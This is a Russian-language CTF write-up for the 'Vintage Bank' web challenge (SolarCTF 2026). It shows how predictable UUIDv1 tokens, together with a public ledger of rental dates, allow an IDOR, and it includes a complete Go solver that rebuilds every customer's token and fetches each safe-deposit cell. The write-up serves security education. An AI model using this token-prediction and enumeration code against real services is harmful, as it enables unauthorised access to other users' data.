# Writeup — Vintage Bank (SolarCTF 2026)

**Категория:** web
**Дата:** 2026-10-17
**Цель:** https://vintage-bank.solarctf.ru
**Флаг:** `SOLARCTF{idor_s4fe_d3posit_b0x}`

## Условие

«Древнейший банк для самых богатых» — текстовый квест: арендуй сейфовую ячейку, получи карту с UUID-токеном, смотри содержимое по токену.

**TL;DR:** UUIDv1-токены предсказуемы (константы `clock_seq`/`node`, гранулярность 1 с), а `/api/ledger` публикует даты аренды — значит токены всех клиентов восстанавливаются без перебора. IDOR через `GET /api/cell/<token>`.

## Разведка

API из трёх ручек:
- `POST /api/rent` → `{"token": "<uuid>", "cell": N}` — аренда ячейки;
- `GET /api/cell/<token>` → `{"cell": ..., "owner": ..., "flag": ...}`;
- `GET /api/ledger` → реестр клиентов `{ord, owner, date, cell}` — **без токенов**.

Оракул валидности: у существующей ячейки `cell != null` (иначе `cell: null`, HTTP 200).

## Уязвимость

Токены — **UUIDv1** (time-based). Наблюдения:
- `clock_seq` = `9a2b` — константа;
- `node` = `0242ac110002` — MAC контейнера, константа;
- timestamp = `unix_sec * 10^7` (subsecond = 0, гранулярность 1 с).

Значит токен однозначно определяется секундой выдачи:

```text
time = (unix_sec + 12219292800) * 10^7   # 12219292800 = сек между 1582-10-15 и 1970-01-01
uuid = time_low-time_mid-time_hi-9a2b-0242ac110002  (version=1)
```

`/api/ledger` публикует точные даты аренды всех клиентов — этого достаточно, чтобы восстановить их токены.

## Эксплуатация

1. `POST /api/rent` → sanity-check: выданный токен совпадает с моделью для текущей секунды (±3 с на clock skew).
2. Для каждой записи ledger парсим `date` (`ДД.ММ.ГГГГ ЧЧ:ММ:СС`, наивный UTC) → строим токен.
3. `GET /api/cell/<token>` по всем кандидатам параллельно.

Флаг — в ячейке №6 (owner `Уточкин С.`, `ord=13`), токен `1b48a100-3f0f-11f1-9a2b-0242ac110002`.

## Воспроизведение (Go, stdlib-only)

```go
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"sync"
	"time"
)

const (
	base           = "https://vintage-bank.solarctf.ru"
	clockSeqRaw    = 0x9a2b
	node           = 0x0242ac110002
	uuidEpochDelta = 12219292800
	workers        = 24
)

var client = &http.Client{Timeout: 20 * time.Second}

func tokenForUnix(unix int64) string {
	t := uint64(unix+uuidEpochDelta) * 10_000_000
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		uint32(t), uint16(t>>32), uint16((t>>48)&0x0fff)|0x1000, clockSeqRaw, node)
}

func httpJSON(path, method string, out any) error {
	var body io.Reader
	if method == "POST" {
		body = bytes.NewReader(nil)
	}
	req, _ := http.NewRequest(method, base+path, body)
	req.Header.Set("User-Agent", "solve/1")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		return fmt.Errorf("http %d", resp.StatusCode)
	}
	return json.NewDecoder(resp.Body).Decode(out)
}

type LedgerEntry struct {
	Ord   int    `json:"ord"`
	Date  string `json:"date"`
	Owner string `json:"owner"`
}

type CellResp struct {
	Cell  any    `json:"cell"`
	Owner string `json:"owner"`
	Flag  string `json:"flag"`
}

func main() {
	var ledger []LedgerEntry
	if err := httpJSON("/api/ledger", "GET", &ledger); err != nil {
		fmt.Fprintln(os.Stderr, "ledger:", err)
		os.Exit(1)
	}

	type result struct {
		e    LedgerEntry
		tok  string
		data *CellResp
	}
	results := make(chan result)
	sem := make(chan struct{}, workers)
	var wg sync.WaitGroup

	for _, e := range ledger {
		ts, err := time.ParseInLocation("02.01.2006 15:04:05", e.Date, time.UTC)
		if err != nil {
			continue
		}
		tok := tokenForUnix(ts.Unix())
		wg.Add(1)
		go func(e LedgerEntry, tok string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			var data CellResp
			if err := httpJSON("/api/cell/"+tok, "GET", &data); err != nil {
				results <- result{e, tok, nil}
				return
			}
			results <- result{e, tok, &data}
		}(e, tok)
	}
	go func() { wg.Wait(); close(results) }()

	for r := range results {
		if r.data == nil || r.data.Cell == nil {
			continue
		}
		if r.data.Flag != "" {
			fmt.Printf("[+] ord=%d cell=%v owner=%q FLAG=%s\n", r.e.Ord, r.data.Cell, r.data.Owner, r.data.Flag)
		}
	}
}
```

## Замечания

- `/api/ledger` **нестабилен**: отдаёт случайное подмножество записей (12–21 из 26 в разных запусках). Один проход может промахнуться — надёжнее собрать union по 3–5 проходам с дедупликацией по `ord`.
- Сервер под нагрузкой таймаутит (`/api/rent`, `/api/cell/*`) — нужны ретраи с паузой.
- Повторная аренда в ту же секунду выдаёт дубликат токена — ещё один признак самодельного генератора.
